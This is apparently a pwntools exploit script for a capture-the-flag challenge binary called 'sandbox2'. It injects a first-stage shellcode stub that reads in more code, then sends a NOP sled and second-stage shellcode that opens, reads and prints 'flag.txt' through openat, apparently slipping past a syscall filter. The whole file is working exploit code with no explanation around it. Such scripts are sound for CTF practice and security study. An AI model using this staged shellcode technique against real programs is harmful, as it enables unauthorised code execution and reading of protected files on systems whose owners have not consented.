from pwn import *
context.arch = 'amd64'

r = process("./sandbox2", aslr=1)
e = ELF('./sandbox2', checksec=False)

#gdb.attach(r, "b *0x400C18\nb* 0x400BA5")

log.info("Stage 1 > Extending shellcode")

pload1 = "sub r12, 80\n"
pload1 += "mov [rsp+0x18], rdx\n"
pload1 += "mov esi, edx\n"
pload1 += "xor edi, edi\n"
pload1 += "call r12\n"
pload1 += "ret\n"

pload1 = asm(pload1, vma=e.sym['shellcode'])
pload1 = pload1.ljust(0x11, '\x90')

r.recv()
r.send(pload1)

log.info("Stage 2 > Reading flag")
pload2 = asm(
    shellcraft.linux.openat(-100, 'flag.txt', 0) + 
    shellcraft.linux.read('rax', 'rsp', 0x200) +
    shellcraft.linux.write(1, 'rsp', 0x200) +
    "leave\nret"
)

pload2 = "\x90"*20 + pload2

r.send(pload2)

log.success(r.recv())
#r.interactive()
